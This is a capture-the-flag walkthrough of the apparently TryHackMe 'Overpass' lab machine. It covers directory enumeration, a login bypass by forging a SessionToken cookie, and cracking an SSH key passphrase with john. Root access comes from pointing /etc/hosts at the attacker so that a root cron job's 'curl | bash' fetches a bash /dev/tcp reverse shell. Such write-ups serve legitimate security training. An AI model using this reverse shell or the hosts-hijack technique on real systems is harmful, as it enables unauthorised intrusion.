# enumating
- nmap
  - 22 ssh
  - 80 http
## gobuster
```console
kali@kali:~$ gobuster dir -u http://10.10.210.80/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -t 54 -x .php,.txt,.html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.210.80/
[+] Threads:        54
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/07/18 07:59:10 Starting gobuster
===============================================================
/404.html (Status: 200)
/aboutus (Status: 301)
/admin (Status: 301)
/admin.html (Status: 200)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
===============================================================
2020/07/18 08:00:38 Finished
===============================================================
```
here is what I found.
- index.html 
```html
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```
my guess they use [Caesar_cipher](https://en.wikipedia.org/wiki/Caesar_cipher)
- /aboutus/: who were disappointed by the number of people getting hacked because their passwords were in **rockyou**.
  - so what? just rockyou and then encryp with **Ceasar**?
  - cerdentail? 
    - Ninja - Lead Developer
    - Pars - Shibe Enthusiast and Emotional Support Animal Manager
    - Szymex - Head Of Security
    - Bee - Chief Drinking Water Coordinator
    - MuirlandOracle - Cryptography Consultant
- download: source code of the overpass. I downloaded it and will it. seem like it is just rot47
  - https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
- admin.html
  - error meassage `Incorrect Credentials`
- /downloads/
  - /builds (Status: 301)
  - /index.html (Status: 301)
  - /src (Status: 301)
so what? just encrypt rockyou and try out to bruteforce it? (hint said no brute force)

```
userlist.txt
admin
Ninja
Pars
Szymex
Bee
MuirlandOracle
```

after 2hr of digging myself a rabbit hole, I got a hint from my dude (n00b-0x31) I got back to correct direction. visit `/admin.html` and check `login.js`
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

## foothold

to bypass the authentication, you need to forcus on **else statement**. We need to crate a cookie call `SessionToken` with value .... (I will not tell you :P, hint: it saids in the code) at path `/admin`. when you done with creating cookie, refresh the page. 


we are in, here is the message on the admin page
```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox
```
Seem like James have some problem remebering his password, The hint is crack youself which might mean that his password should be a common password that we can easily crack it with *rockyou.txt*
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```
There is a tool call `ssh2john`. we can use it to convert the key to a hash format that we can crack it using `john`
```console
kali@kali:~/THM/Overpass$ /usr/share/john/ssh2john.py private.pem > id_rsa.txt
kali@kali:~/THM/Overpass$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
IWILLNOTTELLYOU          (private.pem)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2020-07-19 20:10) 0.2702g/s 3876Kp/s 3876Kc/s 3876KC/sa6_123..*7¡Vamos!
Session completed
kali@kali:~/THM/Overpass$ openssl rsa -in private.pem -out id_rsa
Enter pass phrase for private.pem:
writing RSA key
kali@kali:~/THM/Overpass$ ssh james@10.10.3.134 -i id_rsa 
james@overpass-prod:~$ 
```

# root
finding SUID using [suid3num](https://github.com/Anon-Exploiter/SUID3NUM). 
```console
james@overpass-prod:~$ python3 suid3num.py -e
  ___ _   _ _ ___    _____  _ _   _ __  __ 
 / __| | | / |   \  |__ / \| | | | |  \/  |
 \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
 |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar

[#] Finding/Listing all SUID Binaries ..
------------------------------
finding SUID using 
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
------------------------------
```


I remember that I saw at `cron` tag in a room discribsion
```console
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
There is no *PATH Environment Variable* or *Wildcards* to exploit here (wanna know more about it, [read](LinuxPrivEsc/README.md)). But check the last line of the crontab, each 1 min the corn job will run `curl overpass.thm/downloads/src/buildscript.sh` and pass it to `bash`. I have a plan but for it to works, I have to check `/etc/hosts` if we have write permission.

```console
James@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 252 Jul 20 18:21 /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Bing GO !! the plan is change the `127.0.0.1 overpass.thm` to `<ur ip> overpass.thm` then we can create a *fake* web site using python. Out website will be hosting a `buildscript.sh` which is our reverse shell
```console
kali@kali:~/THM/Overpass/downloads/src$ ls
buildscript.sh
kali@kali:~/THM/Overpass/downloads/src$ cat buildscript.sh # our reverse shell
bash -i >& /dev/tcp/<ip>/<port> 0>&1
kali@kali:~/THM/Overpass/downloads/src$ cd ../../
kali@kali:~/THM/Overpass$ sudo python -m SimpleHTTPServer 80
```
To make this works, it is **important** that the python server have to run in the "web root" directory, for my case `Overpass` is my root. It need to have same stucture as the request in `corntab`. Dont forget open new terminal tab and netcet listen to our shell


now back to james ssh, modify `/etc/hosts` and replace `<ur ip> overpass.thm` with `127.0.0.1 overpass.thm`. let make sure if it works
```console
james@overpass-prod:~$ curl overpass.thm/downloads/src/buildscript.sh
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```
yep it works, now just wait for the cornjob to do it jobs.
```console
kali@kali:~$ nc -nlvp 6969
listening on [any] 6969 ...                                                                        
connect to [10.8.14.151] from (UNKNOWN) [10.10.194.249] 47680                                      
bash: cannot set terminal process group (6422): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
```
well done, cya next time. GL HAPPY HACKING!